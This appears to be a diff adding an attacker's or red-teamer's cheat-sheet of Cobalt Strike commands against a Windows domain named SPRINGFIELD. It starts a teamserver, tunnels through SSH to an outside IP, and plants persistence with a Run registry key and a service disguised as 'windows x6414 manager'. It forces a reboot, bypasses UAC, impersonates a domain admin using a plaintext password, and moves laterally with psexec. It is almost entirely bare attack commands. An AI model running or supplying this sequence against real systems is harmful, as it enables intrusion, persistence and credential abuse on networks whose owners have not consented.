@@ -1,0 +1,27 @@
+~/cobaltstrike# ./teamserver 74.28.31.46 josh1
+
+root@kali:~/cobaltstrike# ./cobaltstrike
+
+ssh -R 74.28.31.46:443:127.0.0.1:443 root@74.28.31.46
+
+run macro
+
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "win6413" /t REG_SZ /F /D "C:\Users\guy.fleegman\AppData\local\Temp\win6413.exe"
+
+shell shutdown /r /t 0 /f
+
+runas SPRINGFIELD\Guy.Fleegman.da RLd24nql34pcvX c:\users\Public\WIN6414.exe
+
+bypassuac
+
+//remind..... create sc exe payload
+shell sc create WIN6414 binpath= "C:\Windows\System32\WIN6414.exe" start= auto DisplayName= "windows x6414 manager"
+
+shell sc description WIN6414 "This is for Nick and Wimpy to see my service"
+shell sc start WIN6414
+
+
+//remind..... must get domain&user first
+make_token SPRINGFIELD\Guy.Fleegman.da RLd24nql34pcvX
+
+psexec_psh 172.16.20.10
